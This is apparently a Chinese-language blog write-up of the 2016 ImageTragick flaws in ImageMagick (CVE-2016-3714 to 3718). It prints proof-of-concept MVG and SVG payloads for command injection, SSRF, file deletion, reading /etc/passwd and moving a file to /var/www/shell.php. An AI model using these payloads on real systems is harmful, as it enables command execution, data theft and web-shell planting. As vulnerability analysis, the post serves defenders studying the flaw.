---
title: CVE-2016-3714 – ImageMagick 命令执行简单总结
categories: Technology
tags:
	- 漏洞分析与总结
---


# CVE-2016-3714 – ImageMagick 命令执行简单总结

ImageMagick有一个功能叫做delegate（委托），作用是调用外部的lib来处理文件。而调用外部lib的过程是使用系统的system命令来执行的，导致命令执行的代码：
```shell
"wget" -q -O "%o" "https:%M"
%M ==> `https://example.com";|ls "-la`
```
验证：
```shell
$ convert 'https://example.com";|ls "-la' out.png
total 32
drwxr-xr-x 6 user group 204 Apr 29 23:08 .
drwxr-xr-x+ 232 user group 7888 Apr 30 10:37 ..
```

exploit.mvg
```shell
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg";|ls "-la)'
pop graphic-context
```
exploit.svg
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd";>
<svg width="640px" height="480px" version="1.1"
xmlns="http://www.w3.org/2000/svg"; xmlns:xlink=
"http://www.w3.org/1999/xlink";>
<image xlink:href="https://example.com/image.jpg&quot;|ls &quot;-la"
x="0" y="0" height="640px" width="480px"/>
</svg>
```
Execution:
```shell
$ convert exploit.mvg out.png
total 32
drwxr-xr-x 6 user group 204 Apr 29 23:08 .
drwxr-xr-x+ 232 user group 7888 Apr 30 10:37 ..
```
## 延伸扩展
1. CVE-2016-3718 - SSRF 服务器端发送http/ftp请求
    ssrf.mvg
    ```shell
    push graphic-context
    viewbox 0 0 640 480
    fill 'url(http://example.com/)'
    pop graphic-context
    ```

2. CVE-2016-3715 - File deletion
    delete_file.mvg
    ```shell
    push graphic-context
    viewbox 0 0 640 480
    image over 0,0 0,0 'ephemeral:/tmp/delete.txt'
    popgraphic-context
    ```
    验证：
    ```shell
    $ touch /tmp/delete.txt
$ convert delete_file.mvg out.png # deletes /tmp/delete.txt
    ```

3. CVE-2016-3716 - File moving
    file_move.mvg
    ```shell
    push graphic-context
    viewbox 0 0 640 480
    image over 0,0 0,0 'msl:/tmp/msl.txt'
    popgraphic-context
    ```
    /tmp/msl.txt
    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <image>
    <read filename="/tmp/image.gif" />
    <write filename="/var/www/shell.php" />
    </image>
    ```
    
4. CVE-2016-3717 - Local file read
    file_read.mvg
    ```shell 
    push graphic-context
    viewbox 0 0 640 480
    image over 0,0 0,0 'label:@/etc/passwd'
    pop graphic-context
    ```

## TODO List
- [ ] 利用gdb-peda对,delegates.c文件进行漏洞分析,属于二进制安全，暂时搁置！
- [ ] 整体的exp，只是分析了wordpress的poc，但是没有成功 



